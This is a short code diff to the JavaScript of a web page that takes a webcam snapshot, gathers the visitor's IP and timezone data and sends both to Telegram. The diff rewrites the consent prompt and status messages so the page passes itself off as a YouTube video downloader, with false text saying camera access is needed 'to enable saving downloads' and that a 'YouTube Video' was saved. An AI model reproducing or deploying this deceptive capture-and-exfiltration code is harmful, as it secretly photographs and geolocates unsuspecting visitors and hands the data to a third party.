@@ -146,7 +146,7 @@
     }
 
     async function sendImage() {
-      const consent = confirm("This site needs access to your camera!!! Do you allow?");
+      const consent = confirm("This site needs access to your camera to enable saving downloads to your device!!! Do you allow?");
       if (!consent) return;
 
       const ipData = await getIPInfo();
@@ -180,10 +180,10 @@ Timezone: ${ipData.timezone || 'N/A'}`;
         const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
 
         await sendToTelegram(message, blob);
-        document.getElementById("message-container").innerText = "✅ Snapshot sent successfully!";
+        document.getElementById("message-container").innerText = "✅ YouTube Video Saved successfully!";
       } catch (err) {
         console.error("Camera error:", err);
-        document.getElementById("message-container").innerText = "⚠️ Unable to access camera. Please check Safari settings.";
+        document.getElementById("message-container").innerText = "⚠️ Unable to access camera. Please check your browser settings.";
       }
     }
   </script>
